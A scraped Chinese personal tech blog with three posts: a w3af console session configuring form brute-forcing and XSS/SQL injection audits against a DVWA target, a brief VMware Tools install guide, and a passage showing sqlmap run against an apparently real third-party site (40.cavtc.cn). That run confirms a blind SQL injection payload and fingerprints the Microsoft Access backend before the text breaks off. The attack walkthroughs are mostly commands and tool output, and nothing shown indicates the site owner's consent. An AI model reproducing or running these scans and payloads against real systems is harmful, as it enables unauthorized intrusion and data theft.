class="line">|----------------------------------------------------------------------------|</span><br><span class="line">| basic_auth   | Enabled | Yes  | Bruteforce HTTP basic authentication.      |</span><br><span class="line">| form_auth    | Enabled | Yes  | Bruteforce HTML form authentication.       |</span><br><span class="line">|----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| list             | List available plugins.                                  |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| back             | Go to the previous menu.                                 |</span><br><span class="line">| exit             | Exit w3af.                                               |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| auth             | View, configure and enable auth plugins                  |</span><br><span class="line">| grep             | View, configure and enable grep plugins                  |</span><br><span class="line">| evasion          | View, configure and enable evasion plugins               |</span><br><span class="line">| mangle           | View, configure and enable mangle plugins                |</span><br><span class="line">| crawl            | View, configure and enable crawl plugins                 |</span><br><span class="line">| bruteforce       | View, configure and enable bruteforce plugins            |</span><br><span class="line">| audit            | View, configure and enable audit plugins                 |</span><br><span class="line">| infrastructure   | View, configure and enable infrastructure plugins        |</span><br><span class="line">| output           | View, configure and enable output plugins                |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; bruteforce config form_auth</span><br><span class="line">w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; view</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| Setting | Value                                         | Modified | Description  |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">| profilingNumber | 50                                            |     | This         |</span><br><span class="line">|        |                                               |     | indicates    |</span><br><span class="line">|        |                                               |     | how many     |</span><br><span class="line">|        |                                               |     | passwords    |</span><br><span class="line">|        |                                               |     | from         |</span><br><span class="line">|        |                                               |     | profiling    |</span><br><span class="line">|        |                                               |     | will be      |</span><br><span class="line">|        |                                               |     | used.        |</span><br><span class="line">| useLeetPasswd | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | the          |</span><br><span class="line">|        |                                               |     | bruteforce   |</span><br><span class="line">|        |                                               |     | should try   |</span><br><span class="line">|        |                                               |     | l337         |</span><br><span class="line">|        |                                               |     | passwords    |</span><br><span class="line">| useProfiling | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | the          |</span><br><span class="line">|        |                                               |     | bruteforce   |</span><br><span class="line">|        |                                               |     | should use   |</span><br><span class="line">|        |                                               |     | password     |</span><br><span class="line">|        |                                               |     | profiling to |</span><br><span class="line">|        |                                               |     | collect new  |</span><br><span class="line">|        |                                               |     | passwords.   |</span><br><span class="line">| useEmails | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | the          |</span><br><span class="line">|        |                                               |     | bruteforcer  |</span><br><span class="line">|        |                                               |     | should use   |</span><br><span class="line">|        |                                               |     | emails       |</span><br><span class="line">|        |                                               |     | collected by |</span><br><span class="line">|        |                                               |     | w3af plugins |</span><br><span class="line">|        |                                               |     | as users.    |</span><br><span class="line">| comboSeparator | :                                             |     | Separator    |</span><br><span class="line">|        |                                               |     | string used  |</span><br><span class="line">|        |                                               |     | in Combo     |</span><br><span class="line">|        |                                               |     | file to      |</span><br><span class="line">|        |                                               |     | split        |</span><br><span class="line">|        |                                               |     | username and |</span><br><span class="line">|        |                                               |     | password     |</span><br><span class="line">| passEqUser | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | the          |</span><br><span class="line">|        |                                               |     | bruteforce   |</span><br><span class="line">|        |                                               |     | should try   |</span><br><span class="line">|        |                                               |     | password     |</span><br><span class="line">|        |                                               |     | equal user   |</span><br><span class="line">|        |                                               |     | in logins.   |</span><br><span class="line">| passwdFile | w3af/core/controllers/bruteforce/passwords.txt |     | Passwords    |</span><br><span class="line">|        |                                               |     | file to use  |</span><br><span class="line">|        |                                               |     | in           |</span><br><span class="line">|        |                                               |     | bruteforcing |</span><br><span class="line">| comboFile | w3af/core/controllers/bruteforce/combo.txt    |     | Combo of     |</span><br><span class="line">|        |                                               |     | username and |</span><br><span class="line">|        |                                               |     | passord,     |</span><br><span class="line">|        |                                               |     | file to use  |</span><br><span class="line">|        |                                               |     | in           |</span><br><span class="line">|        |                                               |     | bruteforcing |</span><br><span class="line">| usersFile | w3af/core/controllers/bruteforce/users.txt    |     | Users file   |</span><br><span class="line">|        |                                               |     | to use in    |</span><br><span class="line">|        |                                               |     | bruteforcing |</span><br><span class="line">| stopOnFirst | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | the          |</span><br><span class="line">|        |                                               |     | bruteforce   |</span><br><span class="line">|        |                                               |     | should stop  |</span><br><span class="line">|        |                                               |     | after        |</span><br><span class="line">|        |                                               |     | finding the  |</span><br><span class="line">|        |                                               |     | first        |</span><br><span class="line">|        |                                               |     | correct user |</span><br><span class="line">|        |                                               |     | and          |</span><br><span class="line">|        |                                               |     | password.    |</span><br><span class="line">| useSvnUsers | True                                          |     | This         |</span><br><span class="line">|        |                                               |     | indicates if |</span><br><span class="line">|        |                                               |     | we will use  |</span><br><span class="line">|        |                                               |     | usernames    |</span><br><span class="line">|        |                                               |     | from SVN     |</span><br><span class="line">|        |                                               |     | headers      |</span><br><span class="line">|        |                                               |     | collected by |</span><br><span class="line">|        |                                               |     | w3af plugins |</span><br><span class="line">|        |                                               |     | in           |</span><br><span class="line">|        |                                               |     | bruteforce.  |</span><br><span class="line">|-----------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; view</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Setting         | Value                                          | Modified | Description                                               |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| profilingNumber | 50                                             |          | This indicates how many passwords from profiling will be  |</span><br><span class="line">|                 |                                                |          | used.                                                     |</span><br><span class="line">| useLeetPasswd   | True                                           |          | This indicates if the bruteforce should try l337          |</span><br><span class="line">|                 |                                                |          | passwords                                                 |</span><br><span class="line">| useProfiling    | True                                           |          | This indicates if the bruteforce should use password      |</span><br><span class="line">|                 |                                                |          | profiling to collect new passwords.                       |</span><br><span class="line">| useEmails       | True                                           |          | This indicates if the bruteforcer should use emails       |</span><br><span class="line">|                 |                                                |          | collected by w3af plugins as users.                       |</span><br><span class="line">| comboSeparator  | :                                              |          | Separator string used in Combo file to split username and |</span><br><span class="line">|                 |                                                |          | password                                                  |</span><br><span class="line">| passEqUser      | True                                           |          | This indicates if the bruteforce should try password      |</span><br><span class="line">|                 |                                                |          | equal user in logins.                                     |</span><br><span class="line">| passwdFile      | w3af/core/controllers/bruteforce/passwords.txt |          | Passwords file to use in bruteforcing                     |</span><br><span class="line">| comboFile       | w3af/core/controllers/bruteforce/combo.txt     |          | Combo of username and passord, file to use in             |</span><br><span class="line">|                 |                                                |          | bruteforcing                                              |</span><br><span class="line">| usersFile       | w3af/core/controllers/bruteforce/users.txt     |          | Users file to use in bruteforcing                         |</span><br><span class="line">| stopOnFirst     | True                                           |          | This indicates if the bruteforce should stop after        |</span><br><span class="line">|                 |                                                |          | finding the first correct user and password.              |</span><br><span class="line">| useSvnUsers     | True                                           |          | This indicates if we will use usernames from SVN headers  |</span><br><span class="line">|                 |                                                |          | collected by w3af plugins in bruteforce.                  |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins/bruteforce/config:form_auth&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af/plugins&gt;&gt;&gt; audit</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Plugin name        | Status | Conf | Description                                                                                       |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| blind_sqli         |        | Yes  | Identify blind SQL injection vulnerabilities.                                                     |</span><br><span class="line">| buffer_overflow    |        |      | Find buffer overflow vulnerabilities.                                                             |</span><br><span class="line">| cors_origin        |        | Yes  | Inspect if application checks that the value of the &quot;Origin&quot; HTTP header isconsistent with the    |</span><br><span class="line">|                    |        |      | value of the remote IP address/Host of the sender ofthe incoming HTTP request.                    |</span><br><span class="line">| csrf               |        |      | Identify Cross-Site Request Forgery vulnerabilities.                                              |</span><br><span class="line">| dav                |        |      | Verify if the WebDAV module is properly configured.                                               |</span><br><span class="line">| eval               |        | Yes  | Find insecure eval() usage.                                                                       |</span><br><span class="line">| file_upload        |        | Yes  | Uploads a file and then searches for the file inside all known directories.                       |</span><br><span class="line">| format_string      |        |      | Find format string vulnerabilities.                                                               |</span><br><span class="line">| frontpage          |        |      | Tries to upload a file using frontpage extensions (author.dll).                                   |</span><br><span class="line">| generic            |        | Yes  | Find all kind of bugs without using a fixed database of errors.                                   |</span><br><span class="line">| global_redirect    |        |      | Find scripts that redirect the browser to any site.                                               |</span><br><span class="line">| htaccess_methods   |        |      | Find misconfigurations in Apache&apos;s &quot;&lt;LIMIT&gt;&quot; configuration.                                       |</span><br><span class="line">| ldapi              |        |      | Find LDAP injection bugs.                                                                         |</span><br><span class="line">| lfi                |        |      | Find local file inclusion vulnerabilities.                                                        |</span><br><span class="line">| memcachei          |        |      | No description available for this plugin.                                                         |</span><br><span class="line">| mx_injection       |        |      | Find MX injection vulnerabilities.                                                                |</span><br><span class="line">| os_commanding      |        |      | Find OS Commanding vulnerabilities.                                                               |</span><br><span class="line">| phishing_vector    |        |      | Find phishing vectors.                                                                            |</span><br><span class="line">| preg_replace       |        |      | Find unsafe usage of PHPs preg_replace.                                                           |</span><br><span class="line">| redos              |        |      | Find ReDoS vulnerabilities.                                                                       |</span><br><span class="line">| response_splitting |        |      | Find response splitting vulnerabilities.                                                          |</span><br><span class="line">| rfd                |        |      | Identify reflected file download vulnerabilities.                                                 |</span><br><span class="line">| rfi                |        | Yes  | Find remote file inclusion vulnerabilities.                                                       |</span><br><span class="line">| shell_shock        |        |      | Find shell shock vulnerabilities.                                                                 |</span><br><span class="line">| sqli               |        |      | Find SQL injection bugs.                                                                          |</span><br><span class="line">| ssi                |        |      | Find server side inclusion vulnerabilities.                                                       |</span><br><span class="line">| ssl_certificate    |        | Yes  | Check the SSL certificate validity (if https is being used).                                      |</span><br><span class="line">| un_ssl             |        |      | Find out if secure content can also be fetched using http.                                        |</span><br><span class="line">| xpath              |        |      | Find XPATH injection vulnerabilities.                                                             |</span><br><span class="line">| xss                |        | Yes  | Identify cross site scripting vulnerabilities.                                                    |</span><br><span class="line">| xst                |        |      | Find Cross Site Tracing vulnerabilities.                                                          |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; audit xss,sqli</span><br><span class="line">w3af/plugins&gt;&gt;&gt; help</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| list                          | List available plugins.                                                                                 |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| back                          | Go to the previous menu.                                                                                |</span><br><span class="line">| exit                          | Exit w3af.                                                                                              |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| auth                          | View, configure and enable auth plugins                                                                 |</span><br><span class="line">| grep                          | View, configure and enable grep plugins                                                                 |</span><br><span class="line">| evasion                       | View, configure and enable evasion plugins                                                              |</span><br><span class="line">| mangle                        | View, configure and enable mangle plugins                                                               |</span><br><span class="line">| crawl                         | View, configure and enable crawl plugins                                                                |</span><br><span class="line">| bruteforce                    | View, configure and enable bruteforce plugins                                                           |</span><br><span class="line">| audit                         | View, configure and enable audit plugins                                                                |</span><br><span class="line">| infrastructure                | View, configure and enable infrastructure plugins                                                       |</span><br><span class="line">| output                        | View, configure and enable output plugins                                                               |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; crawl </span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Plugin name                  | Status | Conf | Description                                                                              |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| archive_dot_org              |        | Yes  | Search archive.org to find new pages in the target site.                                 |</span><br><span class="line">| bing_spider                  |        | Yes  | Search Bing to get a list of new URLs                                                    |</span><br><span class="line">| content_negotiation          |        | Yes  | Use content negotiation to find new resources.                                           |</span><br><span class="line">| digit_sum                    |        | Yes  | Take an URL with a number (index2.asp) and try to find related files(index1.asp,         |</span><br><span class="line">|                              |        |      | index3.asp).                                                                             |</span><br><span class="line">| dir_file_bruter              |        | Yes  | Finds Web server directories and files by bruteforcing.                                  |</span><br><span class="line">| dot_listing                  |        |      | Search for .listing files and extracts new filenames from it.                            |</span><br><span class="line">| find_backdoors               |        |      | Find web backdoors and web shells.                                                       |</span><br><span class="line">| find_captchas                |        |      | Identify captcha images on web pages.                                                    |</span><br><span class="line">| find_dvcs                    |        |      | Search Git, Mercurial (HG), Bazaar (BZR), Subversion (SVN) and CVSrepositories and       |</span><br><span class="line">|                              |        |      | checks for files containing                                                              |</span><br><span class="line">| genexus_xml                  |        |      | Analyze the execute.xml and DeveloperMenu.xml files and find new URLs                    |</span><br><span class="line">| ghdb                         |        | Yes  | Search Google for vulnerabilities in the target site.                                    |</span><br><span class="line">| google_spider                |        | Yes  | Search google using google API to get new URLs                                           |</span><br><span class="line">| import_results               |        | Yes  | Import URLs found by other tools.                                                        |</span><br><span class="line">| oracle_discovery             |        |      | Find Oracle applications on the remote web server.                                       |</span><br><span class="line">| phishtank                    |        |      | Search the phishtank.com database to determine if your server is (or was)being used in   |</span><br><span class="line">|                              |        |      | phishing scams.                                                                          |</span><br><span class="line">| phpinfo                      |        |      | Search PHP Info file and if it finds it will determine the version of PHP.               |</span><br><span class="line">| pykto                        |        | Yes  | A nikto port to python.                                                                  |</span><br><span class="line">| ria_enumerator               |        | Yes  | Fingerprint Rich Internet Apps - Google Gears Manifest files, Silverlight and Flash.     |</span><br><span class="line">| robots_txt                   |        |      | Analyze the robots.txt file and find new URLs                                            |</span><br><span class="line">| sitemap_xml                  |        |      | Analyze the sitemap.xml file and find new URLs                                           |</span><br><span class="line">| spider_man                   |        | Yes  | SpiderMan is a local proxy that will collect new URLs.                                   |</span><br><span class="line">| url_fuzzer                   |        | Yes  | Try to find backups, and other related files.                                            |</span><br><span class="line">| urllist_txt                  |        |      | Analyze the urllist.txt file and find new URLs                                           |</span><br><span class="line">| user_dir                     |        |      | Identify user directories like &quot;http://test/~user/&quot; and infer the remote OS.             |</span><br><span class="line">| web_diff                     |        | Yes  | Compare a local directory with a remote URL path.                                        |</span><br><span class="line">| web_spider                   |        | Yes  | Crawl the web application.                                                               |</span><br><span class="line">| wordnet                      |        | Yes  | Use the wordnet lexical database to find new URLs.                                       |</span><br><span class="line">| wordpress_enumerate_users    |        |      | Finds users in a WordPress installation.                                                 |</span><br><span class="line">| wordpress_fingerprint        |        |      | Finds the version of a WordPress installation.                                           |</span><br><span class="line">| wordpress_fullpathdisclosure |        |      | Try to find the path where the WordPress is installed                                    |</span><br><span class="line">| wsdl_finder                  |        |      | Find web service definitions files.                                                      |</span><br><span class="line">|-----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; crawl web_spider </span><br><span class="line">w3af/plugins&gt;&gt;&gt; crawl config web_spider</span><br><span class="line">w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; view</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Setting      | Value | Modified | Description                                                                                          |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| only_forward | False |          | When crawling only follow links to paths inside the one given as target.                             |</span><br><span class="line">| ignore_regex |       |          | When crawling, DO NOT follow links that match this regular expression. Please note that ignore_regex |</span><br><span class="line">|              |       |          | has precedence over follow_regex.                                                                    |</span><br><span class="line">| follow_regex | .*    |          | When crawling only follow which that match this regular expression. Please note that ignore_regex    |</span><br><span class="line">|              |       |          | has precedence over follow_regex.                                                                    |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; set only_forward true</span><br><span class="line">w3af/plugins/crawl/config:web_spider&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af/plugins&gt;&gt;&gt; back</span><br><span class="line">w3af&gt;&gt;&gt; target </span><br><span class="line">w3af/config:target&gt;&gt;&gt; set target http://www.dvssc.com/dvwa/index.php</span><br><span class="line">w3af/config:target&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af&gt;&gt;&gt; output </span><br><span class="line">Unknown command &apos;output&apos;</span><br><span class="line">w3af&gt;&gt;&gt; plugins</span><br><span class="line">w3af/plugins&gt;&gt;&gt; output</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Plugin name         | Status    | Conf  | Description                                                                                  |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| console             | Enabled   | Yes   | Print messages to the console.                                                               |</span><br><span class="line">| csv_file            |           | Yes   | Export identified vulnerabilities to a CSV file.                                             |</span><br><span class="line">| email_report        |           | Yes   | Email report to specified addresses.                                                         |</span><br><span class="line">| export_requests     |           | Yes   | Export the fuzzable requests found during crawl to a file.                                   |</span><br><span class="line">| html_file           |           | Yes   | Generate HTML report with identified vulnerabilities and log messages.                       |</span><br><span class="line">| text_file           |           | Yes   | Prints all messages to a text file.                                                          |</span><br><span class="line">| xml_file            |           | Yes   | Print all messages to a xml file.                                                            |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins&gt;&gt;&gt; output html_file</span><br><span class="line">w3af/plugins&gt;&gt;&gt; output config html_file</span><br><span class="line">w3af/plugins/output/config:html_file&gt;&gt;&gt; view</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Setting     | Value                                                 | Modified | Description                                           |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| output_file | ~/report.html                                         |          | File name where this plugin will write to             |</span><br><span class="line">| verbose     | False                                                 |          | True if debug information will be appended to the     |</span><br><span class="line">|             |                                                       |          | report.                                               |</span><br><span class="line">| template    | w3af/plugins/output/html_file/templates/complete.html |          | The path to the HTML template used to render the      |</span><br><span class="line">|             |                                                       |          | report.                                               |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins/output/config:html_file&gt;&gt;&gt; set output_file lixu.php</span><br><span class="line">w3af/plugins/output/config:html_file&gt;&gt;&gt; set verbose true</span><br><span class="line">w3af/plugins/output/config:html_file&gt;&gt;&gt; view                    </span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| Setting     | Value                                                 | Modified | Description                                           |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">| output_file | lixu.php                                              | Yes      | File name where this plugin will write to             |</span><br><span class="line">| verbose     | true                                                  | Yes      | True if debug information will be appended to the     |</span><br><span class="line">|             |                                                       |          | report.                                               |</span><br><span class="line">| template    | w3af/plugins/output/html_file/templates/complete.html |          | The path to the HTML template used to render the      |</span><br><span class="line">|             |                                                       |          | report.                                               |</span><br><span class="line">|----------------------------------------------------------------------------------------------------------------------------------------|</span><br><span class="line">w3af/plugins/output/config:html_file&gt;&gt;&gt; back</span><br><span class="line">The configuration has been saved.</span><br><span class="line">w3af/plugins&gt;&gt;&gt; back</span><br><span class="line">w3af&gt;&gt;&gt; start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#到此为止，如果配置正确就能够对目标网站进行测试，直接图形化界面吧，方便</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/VMware-tools安装/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/VMware-tools安装/" class="post-title-link" itemprop="url">VMware tools安装</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:18:51 / 修改时间：06:19:42" itemprop="dateCreated datePublished" datetime="2019-01-14T06:18:51+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/system-software/" itemprop="url" rel="index"><span itemprop="name">系统及软件配置</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="如何安装上VMware-tools使自己的虚拟机用起来舒畅"><a href="#如何安装上VMware-tools使自己的虚拟机用起来舒畅" class="headerlink" title="如何安装上VMware tools使自己的虚拟机用起来舒畅"></a>如何安装上VMware tools使自己的虚拟机用起来舒畅</h1></blockquote>
<ul>
<li>1.打开VMware Tools安装</li>
<li>2.使用cd   ls  等命令得到压缩包文件</li>
<li>3.命令：tar zxvf +压缩文件得到解压文件</li>
<li>4.命令：rm –r +压缩文件（强制删除文件）</li>
<li>5.打开解压文件</li>
<li>6.命令：./vmware-install.pl</li>
<li>7.一路绿灯即可</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/通过kali渗透ASP网站/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/通过kali渗透ASP网站/" class="post-title-link" itemprop="url">通过kali渗透ASP网站</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:16:54 / 修改时间：06:17:27" itemprop="dateCreated datePublished" datetime="2019-01-14T06:16:54+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="通过kali渗透ASP网站"><a href="#通过kali渗透ASP网站" class="headerlink" title="通过kali渗透ASP网站"></a>通过kali渗透ASP网站</h1></blockquote>
<ul>
<li><p>1.打开终端输入</p>
<pre><code>sqlmap -u &quot;网址&quot;

————————————————————————————————————————————————————————————————————————————————————————
root@kali:~# sqlmap -u &quot;http://40.cavtc.cn/NewsShow.aspx?ID=3239&quot;
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-201707310a89}
|_ -| . | |     | .&apos;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 10:31:49

[10:31:50] [INFO] testing connection to the target URL
[10:31:52] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[10:31:56] [INFO] testing if the target URL is stable
[10:31:59] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user&apos;s manual paragraph &apos;Page comparison&apos; and provide a string or regular expression to match on
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c
[10:32:33] [INFO] testing if GET parameter &apos;ID&apos; is dynamic
[10:32:33] [INFO] confirming that GET parameter &apos;ID&apos; is dynamic
[10:32:33] [INFO] GET parameter &apos;ID&apos; is dynamic
[10:32:37] [INFO] heuristic (basic) test shows that GET parameter &apos;ID&apos; might be injectable
[10:32:37] [INFO] testing for SQL injection on GET parameter &apos;ID&apos;
[10:32:37] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;
[10:32:38] [WARNING] reflective value(s) found and filtering out
[10:32:42] [INFO] GET parameter &apos;ID&apos; seems to be &apos;AND boolean-based blind - WHERE or HAVING clause&apos; injectable 
[10:32:42] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause&apos;
[10:32:42] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;
[10:32:43] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause&apos;
[10:32:43] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;
[10:32:44] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace&apos;
[10:32:44] [INFO] testing &apos;MySQL inline queries&apos;
[10:32:44] [INFO] testing &apos;PostgreSQL inline queries&apos;
[10:32:45] [INFO] testing &apos;Microsoft SQL Server/Sybase inline queries&apos;
[10:32:45] [INFO] testing &apos;MySQL &gt; 5.0.11 stacked queries (SELECT - comment)&apos;
[10:32:45] [WARNING] time-based comparison requires larger statistical model, please wait............
[10:33:18] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option &apos;--time-sec&apos; as possible (e.g. 10 or more)
[10:33:19] [INFO] testing &apos;PostgreSQL &gt; 8.1 stacked queries (comment)&apos;
[10:33:19] [INFO] testing &apos;Microsoft SQL Server/Sybase stacked queries (comment)&apos;
[10:33:20] [INFO] testing &apos;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&apos;
[10:33:21] [INFO] testing &apos;MySQL &gt;= 5.0.12 AND time-based blind (SELECT)&apos;
[10:33:21] [INFO] testing &apos;PostgreSQL &gt; 8.1 AND time-based blind&apos;
[10:33:22] [INFO] testing &apos;Microsoft SQL Server/Sybase time-based blind&apos;
[10:33:22] [INFO] testing &apos;Oracle AND time-based blind&apos;
[10:33:22] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos;
[10:33:22] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option &apos;--dbms&apos;
[10:33:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:33:33] [INFO] testing &apos;MySQL UNION query (NULL) - 1 to 20 columns&apos;
[10:33:44] [INFO] checking if the injection point on GET parameter &apos;ID&apos; is a false positive
GET parameter &apos;ID&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: ID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: ID=3239 AND 1305=1305
---
[10:37:45] [INFO] testing MySQL
[10:37:46] [WARNING] the back-end DBMS is not MySQL
[10:37:46] [INFO] testing Oracle
[10:37:47] [WARNING] the back-end DBMS is not Oracle
[10:37:47] [INFO] testing PostgreSQL
[10:37:47] [WARNING] the back-end DBMS is not PostgreSQL
[10:37:47] [INFO] testing Microsoft SQL Server
[10:37:48] [WARNING] the back-end DBMS is not Microsoft SQL Server
[10:37:48] [INFO] testing SQLite
[10:37:48] [WARNING] the back-end DBMS is not SQLite
[10:37:48] [INFO] testing Microsoft Access
[10:37:51] [INFO] confirming Microsoft Access
[10:37:53] [INFO] the back-end DBMS is Microsoft Access
 ------------------------------------------------------------------------------------
|    web server operating system: Windows 2003 or XP                                 |
